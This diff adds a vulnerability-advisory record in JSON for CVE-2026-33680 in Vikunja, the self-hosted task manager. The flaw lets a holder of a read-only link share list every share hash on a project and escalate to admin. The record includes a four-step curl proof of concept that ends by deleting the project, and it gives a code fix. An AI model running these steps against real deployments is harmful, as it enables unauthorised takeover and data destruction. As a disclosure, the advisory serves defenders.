@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-8hp8-9fhr-pfm9",
+  "modified": "2026-03-26T21:11:27.465016Z",
+  "published": "2026-03-25T21:18:08Z",
+  "aliases": [
+    "CVE-2026-33680",
+    "GO-2026-4848"
+  ],
+  "summary": "Vikjuna: Link Share Hash Disclosure via ReadAll Endpoint Enables Permission Escalation",
+  "details": "## Summary\n\nThe `LinkSharing.ReadAll()` method allows link share authenticated users to list all link shares for a project, including their secret hashes. While `LinkSharing.CanRead()` correctly blocks link share users from reading individual shares via `ReadOne`, the `ReadAllWeb` handler bypasses this check by never calling `CanRead()`. An attacker with a read-only link share can retrieve hashes for write or admin link shares on the same project and authenticate with them, escalating to full admin access.\n\n## Details\n\nThe vulnerability arises from an inconsistency between the `ReadOneWeb` and `ReadAllWeb` generic handlers and the `LinkSharing` permission model.\n\n**`LinkSharing.CanRead()` correctly blocks link share users** (`pkg/models/link_sharing_permissions.go:25-29`):\n```go\nfunc (share *LinkSharing) CanRead(s *xorm.Session, a web.Auth) (bool, int, error) {\n\tif _, is := a.(*LinkSharing); is {\n\t\treturn false, 0, nil  // Blocks link share users\n\t}\n\t// ...\n}\n```\n\n**`ReadOneWeb` calls `CanRead()` before returning data** (`pkg/web/handler/read_one.go:64`):\n```go\ncanRead, maxPermission, err := currentStruct.CanRead(s, currentAuth)\nif !canRead {\n    return echo.NewHTTPError(http.StatusForbidden, ...)\n}\n```\n\n**`ReadAllWeb` does NOT call `CanRead()`** (`pkg/web/handler/read_all.go:106`):\n```go\n// Directly calls ReadAll without permission check\nresult, resultCount, numberOfItems, err := currentStruct.ReadAll(s, currentAuth, search, pageNumber, perPageNumber)\n```\n\n**`LinkSharing.ReadAll()` only checks project-level read access** (`pkg/models/link_sharing.go:228-236`):\n```go\nfunc (share *LinkSharing) ReadAll(s *xorm.Session, a web.Auth, ...) (...) {\n    project := \u0026Project{ID: share.ProjectID}\n    can, _, err := project.CanRead(s, a)  // Link share users pass this!\n    if !can {\n        return nil, 0, 0, ErrGenericForbidden{}\n    }\n    // Returns all shares with hashes...\n```\n\n**`Project.CanRead()` allows link share users** (`pkg/models/project_permissions.go:105-108`):\n```go\nshareAuth, ok := a.(*LinkSharing)\nif ok {\n    return p.ID == shareAuth.ProjectID \u0026\u0026 (shareAuth.Permission == PermissionRead || ...), ...\n}\n```\n\nThe `Hash` field is exposed in JSON serialization (`pkg/models/link_sharing.go:50`):\n```go\nHash string `xorm:\"varchar(40) not null unique\" json:\"hash\" param:\"hash\"`\n```\n\nWhile the `Password` field is cleared at line 276, the `Hash` — which is the secret token used to authenticate — is returned in full.\n\n## PoC\n\n**Prerequisites:** A project with multiple link shares at different permission levels (common scenario: a read-only share for public access and a write/admin share for collaborators).\n\n**Step 1: Authenticate with a read-only link share**\n```bash\n# Authenticate with a read-only link share hash\ncurl -s -X POST http://localhost:3456/api/v1/shares/READ_ONLY_HASH/auth \\\n  | jq '.token'\n# Returns: JWT token with permission=0 (read)\n```\n\n**Step 2: List all link shares for the project (hash disclosure)**\n```bash\n# Use the read-only JWT to list ALL shares including their hashes\ncurl -s -H \"Authorization: Bearer \u003cread-only-jwt\u003e\" \\\n  http://localhost:3456/api/v1/projects/PROJECT_ID/shares \\\n  | jq '.[].hash, .[].permission'\n# Returns ALL shares with their hashes and permission levels:\n# \"READ_ONLY_HASH\"   permission: 0\n# \"ADMIN_HASH\"       permission: 2    \u003c-- leaked!\n```\n\n**Step 3: Escalate to admin using the leaked hash**\n```bash\n# Authenticate with the admin link share hash\ncurl -s -X POST http://localhost:3456/api/v1/shares/ADMIN_HASH/auth \\\n  | jq '.token'\n# Returns: JWT token with permission=2 (admin)\n```\n\n**Step 4: Exercise admin privileges**\n```bash\n# Delete the project (admin-only operation)\ncurl -s -X DELETE -H \"Authorization: Bearer \u003cadmin-jwt\u003e\" \\\n  http://localhost:3456/api/v1/projects/PROJECT_ID\n# Success — full admin access achieved from a read-only share\n```\n\n## Impact\n\n- **Permission escalation:** An attacker with any link share URL (including read-only) can escalate to the highest permission level of any other link share on the same project\n- **Credential disclosure:** All link share hashes for a project are exposed, which are effectively bearer tokens\n- **No account required:** Link shares are designed for unauthenticated access — the attacker only needs a link share URL that was shared publicly or forwarded to them\n- **Common scenario:** Projects with both read-only (public) and write/admin (collaborator) link shares are the standard use case for tiered sharing\n- **Password-protected shares:** Even password-protected share hashes are leaked, though exploitation requires knowing/brute-forcing the password\n\n## Recommended Fix\n\nAdd a link share user check at the beginning of `LinkSharing.ReadAll()`, mirroring the check in `CanRead()`:\n\n```go\n// In pkg/models/link_sharing.go, at the start of ReadAll():\nfunc (share *LinkSharing) ReadAll(s *xorm.Session, a web.Auth, search string, page int, perPage int) (result interface{}, resultCount int, totalItems int64, err error) {\n\t// Don't allow link share users to list link shares\n\tif _, is := a.(*LinkSharing); is {\n\t\treturn nil, 0, 0, ErrGenericForbidden{}\n\t}\n\n\tproject := \u0026Project{ID: share.ProjectID}\n\t// ... rest of method unchanged\n```\n\nAlternatively, as a defense-in-depth measure, exclude the `Hash` field from JSON serialization for list responses by using `json:\"-\"` and only returning it on creation. However, the primary fix should be the authorization check since the hash is needed in the creation response.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-8hp8-9fhr-pfm9/GHSA-8hp8-9fhr-pfm9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33680"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/9efe1fadba817923c7c7f5953c3e9e9c5683bbf3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://vikunja.io/changelog/vikunja-v2.2.2-was-released"
+    }
+  ]
+}
